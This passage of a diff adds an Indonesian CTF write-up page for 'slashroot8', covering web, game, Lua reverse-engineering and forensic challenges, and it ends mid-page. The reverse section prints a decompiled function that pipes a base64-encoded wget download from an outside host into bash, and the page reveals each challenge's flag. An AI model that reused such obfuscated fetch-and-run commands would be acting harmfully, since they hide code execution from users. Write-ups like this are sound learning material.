+        alt="/images/slashroot8_web3-01.png"
+        title="EZZ Momento-01" width="869" height="114" /></p>
+<h3 id="flag-2">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>slashroot8{it_is_really_private_UwU}</strong></div>
+        </div>
+    </div>
+<hr>
+<h1 id="joy">Joy</h1>
+<h2 id="package-delivery">Package Delivery</h2>
+<h3 id="deskripsi-3">Deskripsi</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>A game about a mundane task&hellip;</p>
+<p>Some say if you deliver an exact number of packages, a magic text will appear??</p>
+</div>
+        </div>
+    </div>
+<h3 id="langkah-penyelesaian-3">Langkah Penyelesaian</h3>
+<ul>
+<li>Challenge ini sangat mudah dari yang saya bayangkan, hanya modal <code>strings</code> langsung solve.</li>
+<li>Awalnya saya coba mainkan gamenya dulu siapa tau ada anomali kan wkwk.</li>
+<li>Ternyata di harus sampe score 9999 baru ada gift spesial (mungkin aja flag).</li>
+<li>Ngapain harus se-effort itu kan, lalu saya coba quick analysis file <code>.pck</code> untuk nemuin something interest.</li>
+<li>Alhamdulillah, ketika saya coba cari <strong>&ldquo;slashroot&rdquo;</strong> langsung ketemu flagnya. Agak curiga sih di awal kenapa semudah itu, tapi gas ajalah wkwk.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/slashroot8_joy1-01.png"
+        data-srcset="/images/slashroot8_joy1-01.png, /images/slashroot8_joy1-01.png 1.5x, /images/slashroot8_joy1-01.png 2x"
+        data-sizes="auto"
+        alt="/images/slashroot8_joy1-01.png"
+        title="Package Delivery-01" width="611" height="97" /></p>
+<h3 id="flag-3">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>slashroot8{N0T90Nn4l1e_tH4T_w45_E45y_hUh?}</strong></div>
+        </div>
+    </div>
+<hr>
+<h1 id="reverse">Reverse</h1>
+<h2 id="baby-lua">baby-lua</h2>
+<h3 id="deskripsi-4">Deskripsi</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">lua but baby</div>
+        </div>
+    </div>
+<h3 id="langkah-penyelesaian-4">Langkah Penyelesaian</h3>
+<ul>
+<li>Disclaimer dulu, saya gak jago Reverse ya ges, iseng-iseng aja ini.</li>
+<li>Setelah saya coba decompile menggunakan Ghidra, ada something interesting di fungsi <code>init()</code>, di mana mengeksekusi command seperti berikut.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">init</span><span class="p">(</span><span class="n">EVP_PKEY_CTX</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_408</span> <span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="nf">sprintf</span><span class="p">(</span><span class="n">local_408</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">          <span class="s">&#34;echo d2dldCAtcSAtTyAvdG1wL3V3dSBodHRwczovL2FpbWFyLmlkL2ZsYWcubHVhYw== | base64 -d | bash&#34;</span>
+</span></span><span class="line"><span class="cl">         <span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">system</span><span class="p">(</span><span class="n">local_408</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">iVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<ul>
+<li>Ketika saya coba execute command tersebut di local machine, ada file <code>uwu</code> di direktori <code>/tmp</code>. Saya coba cek file apakah itu, ternyata merupakan file bytecode dalam bahasa Lua.</li>
+<li>Langsung saja saya decompile bytecode itu dan ini hasilnya.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-lua">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-lua" data-lang="lua"><span class="line"><span class="cl">    <span class="c1">-- filename: </span>
+</span></span><span class="line"><span class="cl">    <span class="c1">-- version: lua52</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">-- line: [0, 0] id: 0</span>
+</span></span><span class="line"><span class="cl">    <span class="n">check_flag</span> <span class="o">=</span> <span class="kr">function</span><span class="p">(</span><span class="n">r0_1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">-- line: [1, 45] id: 1</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">local</span> <span class="n">r1_1</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">       <span class="p">...</span> <span class="n">omitted</span> <span class="p">...,</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">local</span> <span class="n">r2_1</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">for</span> <span class="n">r6_1</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="o">#</span><span class="n">r0_1</span><span class="p">,</span> <span class="mi">1</span> <span class="kr">do</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">local</span> <span class="n">r8_1</span> <span class="o">=</span> <span class="n">string.byte</span><span class="p">(</span><span class="n">r0_1</span><span class="p">:</span><span class="n">sub</span><span class="p">(</span><span class="n">r6_1</span><span class="p">,</span> <span class="n">r6_1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="kr">for</span> <span class="n">r12_1</span> <span class="o">=</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span> <span class="kr">do</span>
+</span></span><span class="line"><span class="cl">        <span class="kr">if</span> <span class="mi">2</span> <span class="o">^</span> <span class="n">r12_1</span> <span class="o">&lt;=</span> <span class="n">r8_1</span> <span class="kr">then</span>
+</span></span><span class="line"><span class="cl">            <span class="n">r2_1</span> <span class="o">=</span> <span class="n">r2_1</span> <span class="o">..</span> <span class="s2">&#34;1&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">r8_1</span> <span class="o">=</span> <span class="n">r8_1</span> <span class="o">-</span> <span class="mi">2</span> <span class="o">^</span> <span class="n">r12_1</span>
+</span></span><span class="line"><span class="cl">        <span class="kr">else</span>
+</span></span><span class="line"><span class="cl">            <span class="n">r2_1</span> <span class="o">=</span> <span class="n">r2_1</span> <span class="o">..</span> <span class="s2">&#34;0&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="kr">end</span>
+</span></span><span class="line"><span class="cl">        <span class="kr">end</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">end</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">if</span> <span class="o">#</span><span class="n">r2_1</span> <span class="o">~=</span> <span class="o">#</span><span class="n">r1_1</span> <span class="kr">then</span>
+</span></span><span class="line"><span class="cl">        <span class="kr">return</span> <span class="kc">false</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">end</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">local</span> <span class="n">r3_1</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">for</span> <span class="n">r7_1</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="o">#</span><span class="n">r1_1</span><span class="p">,</span> <span class="mi">1</span> <span class="kr">do</span>
+</span></span><span class="line"><span class="cl">        <span class="kr">if</span> <span class="n">tonumber</span><span class="p">(</span><span class="n">r2_1</span><span class="p">:</span><span class="n">sub</span><span class="p">(</span><span class="n">r7_1</span><span class="p">,</span> <span class="n">r7_1</span><span class="p">))</span> <span class="o">==</span> <span class="n">r1_1</span><span class="p">[</span><span class="n">r7_1</span><span class="p">]</span> <span class="kr">then</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r3_1</span> <span class="o">=</span> <span class="n">r3_1</span> <span class="o">+</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">        <span class="kr">end</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">end</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">local</span> <span class="n">r4_1</span> <span class="o">=</span> <span class="n">r2_1</span> <span class="o">==</span> <span class="n">table.concat</span><span class="p">(</span><span class="n">r1_1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">end</span></span></span></code></pre></div></div>
+<ul>
+<li>Kode Lua di atas tampaknya melakukan pengecekan flag dengan mengubah input menjadi representasi biner dan membandingkannya dengan array biner yang telah ditentukan.</li>
+<li>Langsung saja saya buat solver scriptnya menggunakan Python.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Function to decode flag from binary array</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decode_flag</span><span class="p">(</span><span class="n">binary_array</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Convert binary array to string</span>
+</span></span><span class="line"><span class="cl">    <span class="n">binary_string</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">str</span><span class="p">,</span> <span class="n">binary_array</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Split binary string into 8-bit chunks</span>
+</span></span><span class="line"><span class="cl">    <span class="n">chunks</span> <span class="o">=</span> <span class="p">[</span><span class="n">binary_string</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">binary_string</span><span class="p">),</span> <span class="mi">8</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Convert each chunk to character</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">chunk</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span> <span class="k">for</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="n">chunks</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">flag</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Binary array from the Lua code</span>
+</span></span><span class="line"><span class="cl"><span class="n">binary_array</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">decode_flag</span><span class="p">(</span><span class="n">binary_array</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Flag:&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span></span></span></code></pre></div></div>
+<h3 id="flag-4">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>slashroot8{ez_0n3_f0r_y0u_see_y0u_1n_f1n4l}</strong></div>
+        </div>
+    </div>
+<hr>
+<h1 id="forensic">Forensic</h1>
+<h2 id="find-the-key">Find The Key</h2>
+<h3 id="deskripsi-5">Deskripsi</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>Temukan key = solve</p>
+<p>Filename: ssstttttt.unknown</p>
+</div>
+        </div>
+    </div>
+<h3 id="langkah-penyelesaian-5">Langkah Penyelesaian</h3>
+<ul>
+<li>Saya coba liat file signature dari file tersebut, sepertinya terpotong. Bisa dilihat pada gambar di bawah, 3 digit hex yang di-highlight sepertinya indikasi file JPG.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/slashroot8_foren1-01.png"
+        data-srcset="/images/slashroot8_foren1-01.png, /images/slashroot8_foren1-01.png 1.5x, /images/slashroot8_foren1-01.png 2x"
+        data-sizes="auto"
+        alt="/images/slashroot8_foren1-01.png"
+        title="Find The Key-01" width="980" height="186" /></p>
+<ul>
+<li>Setelah saya coba fix dengan file signature yang sesuai, tidak ada flag yang muncul.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
